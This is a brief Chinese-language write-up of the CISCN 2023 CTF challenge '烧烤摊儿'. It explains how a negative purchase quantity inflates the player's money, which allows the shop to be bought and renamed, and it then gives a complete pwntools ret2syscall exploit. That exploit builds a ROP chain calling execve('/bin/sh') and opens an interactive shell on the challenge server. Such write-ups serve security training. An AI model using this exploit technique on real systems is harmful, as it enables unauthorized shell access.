[[CISCN 2023 初赛]烧烤摊儿 | NSSCTF](https://www.nssctf.cn/problem/4055)
一道并不难的题目，实际运行后可以发现在输入数量的地方可以输入负数，从而将钱的数量增加
![[Pasted image 20240919103614.png]]
钱够了后可以将店买下来，买下来后可以改名，改名后会将输入的字符串放在`name`变量中，同时查看`ROPgadget`可以发现有`syscall`，
故为一道`ret2syscall`

exp:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
local = False
if local:
    p = process('./shaokao')
else:
    p = remote('node4.anna.nssctf.cn', 28230)
syscall_addr = 0x402404
rdi = 0x40264f
ret = 0x40101a
rax_rdx_rbx = 0x4a404a
rsi = 0x40a67e
name = 0x4E60F0

p.sendline(b'1')
p.sendline(b'1')
p.sendline(b'-99999999')
p.sendline(b'4')
p.sendline(b'5')

payload = b'/bin/sh\x00'
payload += b'a' * (0x20)
payload += p64(rax_rdx_rbx) + p64(59) + p64(0) + p64(0)
payload += p64(rdi) + p64(name)
payload += p64(rsi) + p64(0)
payload += p64(syscall_addr)

p.sendline(payload)

p.interactive()
```